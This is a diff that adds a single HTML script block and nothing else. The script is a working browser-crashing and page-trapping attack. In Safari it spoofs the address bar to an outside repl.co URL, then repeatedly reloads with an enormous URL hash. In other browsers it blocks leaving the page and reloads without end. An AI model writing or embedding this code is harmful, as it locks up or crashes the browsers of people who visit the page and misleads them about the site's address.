@@ -1,0 +1,13 @@
+<script>
+  if(/^((?!chrome|android).)*safari/i.test(navigator.userAgent)){
+    window.onload=setInterval.bind(this, async ()=>{
+      history.pushState({},"","https://k.i5.repl.co/")
+      location.hash="M"+"\u0001".repeat(2**25)+Math.random();
+      location.reload(1)
+    }, 0)()
+    
+  }else{
+    window.onbeforeunload=function(){return 1}
+    while(1)location.reload(1)
+  }
+</script>
